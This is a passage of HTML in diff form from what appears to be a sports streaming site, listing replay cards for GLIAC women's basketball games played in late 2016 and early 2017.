+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_54.jpg?itok=wd5Om-ef" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_54.jpg?itok=Em8SejBD" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_54.jpg?itok=tgTeGD7-" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_54.jpg?itok=fdeibsMf" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_54.jpg?itok=wd5Om-ef" alt="Michigan Tech at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Michigan Tech<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-30T23:55:00+00:00" data-format="d M H:i T">30 Jan 23:55 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Michigan Tech at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-6 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/21/northwood-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_51.jpg?itok=qt9U4Z-v" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_51.jpg?itok=Dybj9AEu" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_51.jpg?itok=AMBQtfHZ" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_51.jpg?itok=-WXP42jJ" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_51.jpg?itok=qt9U4Z-v" alt="Northwood at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Northwood<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-21T16:00:00+00:00" data-format="d M H:i T">21 Jan 16:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Northwood at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-7 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/19/lake-superior-state-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_50.jpg?itok=2KXItJaI" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_50.jpg?itok=Tk9Pxpi7" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_50.jpg?itok=wnUVd_aJ" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_50.jpg?itok=zD-bhxt8" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_50.jpg?itok=2KXItJaI" alt="Lake Superior State at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Superior State<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-19T23:00:00+00:00" data-format="d M H:i T">19 Jan 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Lake Superior State at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-main-featured-video__item view-display-homepage-featured-events__item views-row views-row-8 views-row-even views-row-last" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/14/grand-valley-state-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" alt="Grand Valley State at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Grand Valley State<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-14T18:00:00+00:00" data-format="d M H:i T">14 Jan 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Grand Valley State at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>    </div>
+  
+  
+  
+  
+  </div>              <h4 class="eversport-event__no-upcoming u-ta-l">No featured events at this time.</h4>
+            </div>
+          </div>
+          <div class="primary-grid__col-2 primary-grid__col-2--stretch site-container--md">
+            <div class="view view-promo view-id-promo view-display-id-league_promo view-dom-id-f22c639e76204659b1694fc5461db84a view-total-rows-0">
+  
+  
+  
+      <div class="view view-promo view-id-promo view-display-id-home_promo view-dom-id-04f7e4c64992ea6b2bbfb4ce35bddb1a view-total-rows-0">
+  
+  
+  
+  
+  
+  
+  
+  </div>  
+  
+  
+  
+  </div>            <div class="g-simple-tabs tab-style-1 homepage-tabs primary-grid__col-2--stretch" id="homepage-tabs">
+              <nav class="g-simple-tab__tabs-container tab-style-1__tab-container">
+                <div class="g-simple-tabs__tab-item tab-style-1__tab-item is-active" data-tab="Live-and-Upcoming">
+                  Live &amp; Upcoming
+                </div>
+                <div class="g-simple-tabs__tab-item tab-style-1__tab-item" data-tab="On-Demand">
+                  On-Demand
+                </div>
+              </nav>
+
+              <div class="g-simple-tabs__content-container tab-style-1__content-container primary-grid__col-2--stretch event-style__container--img-bg">
+                <div class="g-simple-tabs__content-item tab-style-1__content-item primary-grid__col-2--stretch is-active" data-tab="Live-and-Upcoming">
+                  <div class="view view-upcoming-videos view-id-upcoming_videos view-display-id-page view-dom-id-9ad2bccf018cd5e7109eec013565b2df view-total-rows-0">
+  
+  
+  
+      <h4 class="eversport-event__no-upcoming">No upcoming events at this time.</h4>  
+  
+  
+  
+  </div>                </div>
+                <div class="g-simple-tabs__content-item tab-style-1__content-item primary-grid__col-2--stretch" data-tab="On-Demand">
+                  <div class="view view-upcoming-videos view-id-upcoming_videos view-display-id-archived view-dom-id-c493840264f4bd4bcc4e0bb396e3ae76 view-total-rows-40">
+  
+  
+  
+      <div class="view-upcoming-videos__content">
+        <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-1 views-row-odd views-row-first" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/18/wayne-state-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Wayne State at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Wayne State<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-18T18:00:00+00:00" data-format="d M H:i T">18 Feb 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Wayne State at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-2 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/16/saginaw-valley-state-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Saginaw Valley State at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Saginaw Valley State<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-16T22:30:00+00:00" data-format="d M H:i T">16 Feb 22:30 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Saginaw Valley State at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-3 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/11/wayne-state-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_56.jpg?itok=dhaavWnA" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_56.jpg?itok=AQ-3IZSw" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_56.jpg?itok=nnE9tm72" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_56.jpg?itok=GyE0cFKk" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Wayne State at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Wayne State<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-11T16:00:00+00:00" data-format="d M H:i T">11 Feb 16:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Wayne State at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-4 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/2/9/saginaw-valley-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_55.jpg?itok=yvOpNAHX" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_55.jpg?itok=9zxhuY1w" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_55.jpg?itok=AbQn9Owd" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_55.jpg?itok=A1ce5cSL" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Saginaw Valley at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Saginaw Valley<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-02-09T23:00:00+00:00" data-format="d M H:i T">09 Feb 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Saginaw Valley at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-5 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/30/michigan-tech-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_54.jpg?itok=wd5Om-ef" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_54.jpg?itok=Em8SejBD" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_54.jpg?itok=tgTeGD7-" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_54.jpg?itok=fdeibsMf" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Michigan Tech at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Michigan Tech<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-30T23:55:00+00:00" data-format="d M H:i T">30 Jan 23:55 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Michigan Tech at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-6 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/21/northwood-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_51.jpg?itok=qt9U4Z-v" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_51.jpg?itok=Dybj9AEu" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_51.jpg?itok=AMBQtfHZ" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_51.jpg?itok=-WXP42jJ" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Northwood at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Northwood<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-21T16:00:00+00:00" data-format="d M H:i T">21 Jan 16:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Northwood at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-7 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/19/lake-superior-state-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_50.jpg?itok=2KXItJaI" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_50.jpg?itok=Tk9Pxpi7" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_50.jpg?itok=wnUVd_aJ" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_50.jpg?itok=zD-bhxt8" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Lake Superior State at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Superior State<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-19T23:00:00+00:00" data-format="d M H:i T">19 Jan 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Lake Superior State at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-8 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/14/grand-valley-state-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Grand Valley State at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Grand Valley State<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-14T18:00:00+00:00" data-format="d M H:i T">14 Jan 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Grand Valley State at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-9 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2017/1/12/ferris-state-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Ferris State at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Ferris State<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2017-01-12T23:59:59+00:00" data-unknown-time="1" data-format="d M">12 Jan</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Ferris State at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-10 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/18/algoma-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/lake_superior_1920x1080_3.jpg?itok=5JaRK38F" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/lake_superior_1920x1080_3.jpg?itok=DXhwIsSX" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/lake_superior_1920x1080_3.jpg?itok=WzHeT7Rk" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/lake_superior_1920x1080_3.jpg?itok=LRzALUZ8" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Algoma at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Algoma<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-18T18:00:00+00:00" data-format="d M H:i T">18 Dec 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Algoma at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-11 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/17/hillsdale-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_49.jpg?itok=Hal-Y3Ln" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_49.jpg?itok=bBzjF8UV" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_49.jpg?itok=tZQA77O4" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_49.jpg?itok=BSjme8Vg" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Hillsdale at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Hillsdale<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-17T18:00:00+00:00" data-format="d M H:i T">17 Dec 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Hillsdale at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-12 views-row-even" >
